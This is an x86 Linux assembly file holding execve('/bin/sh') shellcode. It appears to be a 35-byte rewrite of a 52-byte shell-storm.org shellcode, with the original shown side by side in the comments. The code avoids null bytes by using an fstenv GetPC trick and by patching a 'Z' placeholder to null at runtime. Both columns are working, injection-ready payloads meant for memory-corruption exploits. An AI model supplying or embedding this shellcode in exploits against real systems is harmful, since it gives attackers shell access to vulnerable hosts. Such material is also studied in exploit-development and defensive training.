;my version(35 bytes)					;original(52 bytes)
							;http://shell-storm.org/shellcode/files/shellcode-863.php
global _start
section .text

_start:
;fstenv getpc: the entry					 
;mem addr of this code (_start)
fldpi							;jmp short here
fstenv [esp-0xc]					;me:
;ebx now contains the address				; pop esi
;of _start						; mov edi,esi
pop ebx							; xor eax,eax
xor eax, eax						; push eax
;the offset bytes					; mov edx,esp
;to point at the command string				; push eax
;@ the end of the program				; add esp,3
mov al, 0x1b						; lea esi,[esi+4]
;add to ebx to get the addr				; xor eax,[esi]
;dinamically						; push eax
add ebx, eax						; xor eax,eax
xor eax,eax						; xor eax,[edi]
;replace the Z char to null				; push eax
;terminate the command					; mov ebx,esp
mov byte[ebx+7],al					; xor eax,eax
;clean register						; push eax
xor ecx,ecx						; lea edi,[ebx]
xor edx,edx						; push edi
mov    al,0xb						; mov ecx,esp
int    0x80						; mov al,0xb
db '/bin/shZ'						; int 0x80
							;here:
							; call me
							; path db "//bin/sh"
